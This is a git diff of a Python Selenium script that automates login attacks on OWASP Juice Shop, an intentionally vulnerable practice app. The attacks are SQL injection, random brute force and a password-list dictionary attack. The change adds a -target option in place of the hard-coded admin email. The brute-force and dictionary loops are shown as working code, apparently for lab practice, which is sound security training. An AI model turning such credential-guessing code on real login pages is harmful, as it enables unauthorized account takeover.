@@ -22,13 +22,16 @@ def randomhard():
     length = random.randint(1, 16)
     return ''.join(random.choice(all_letters) for i in range (length))
 
+
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('-method', required=True) # valid types: sql, brute, dict
     parser.add_argument('-attempts', nargs='?', const=10000) # make depth attempts, only for admin_brute
+    parser.add_argument('-target', nargs='?', const="admin@juice-sh.op")
     args = parser.parse_args()
     method = str(args.method)
     attempts = int(args.attempts)
+    target = str(args.target)
     
     # Initialize the WebDriver
     driver = webdriver.Chrome()  # Use the browser of your choice (e.g., Firefox, Edge)
@@ -49,11 +52,11 @@ def main():
     if(method == "sql"):
         logInAdminSql(driver)
     elif(method == "brute"):
-        bruteForcePassword(driver, attempts, False)
+        bruteForcePassword(driver, attempts, False, target)
     elif(method == "hardbrute"):
-        bruteForcePassword(driver, attempts, True)
+        bruteForcePassword(driver, attempts, True, target)
     elif(method == "dict"):
-        databasePassword(driver)
+        databasePassword(driver, target)
     else:
         print("Usage: adminLogin.py -method=[sql, brute]")
     # Close the browser
@@ -61,7 +64,7 @@ def main():
     driver.quit()
     exit()
 
-def databasePassword(driver):
+def databasePassword(driver, target):
     try:
 
         acctBtn = WebDriverWait(driver, 10).until(
@@ -79,7 +82,7 @@ def databasePassword(driver):
     emailField = WebDriverWait(driver, 10).until(
         EC.presence_of_element_located((By.ID, "email"))
     )
-    emailField.send_keys("admin@juice-sh.op")
+    emailField.send_keys(target)
     # Open file and test each password
     with open("passwords.txt") as f:
         for password in f:
@@ -94,7 +97,7 @@ def databasePassword(driver):
             except Exception as e:
                 print(f"Could not enter text: {e}")
 
-def bruteForcePassword(driver, attempts, hardness):
+def bruteForcePassword(driver, attempts, hardness, target):
         # Attempt to log in
     print("Strap in, this could take quite a while")
     mercy = random.randint(250, 350)
@@ -115,7 +118,7 @@ def bruteForcePassword(driver, attempts, hardness):
     emailField = WebDriverWait(driver, 10).until(
         EC.presence_of_element_located((By.ID, "email"))
     )
-    emailField.send_keys("admin@juice-sh.op")
+    emailField.send_keys(target)
     # Open file and test each password
     #with open("genericPasswords.txt") as f:
     for n in range(1, attempts):
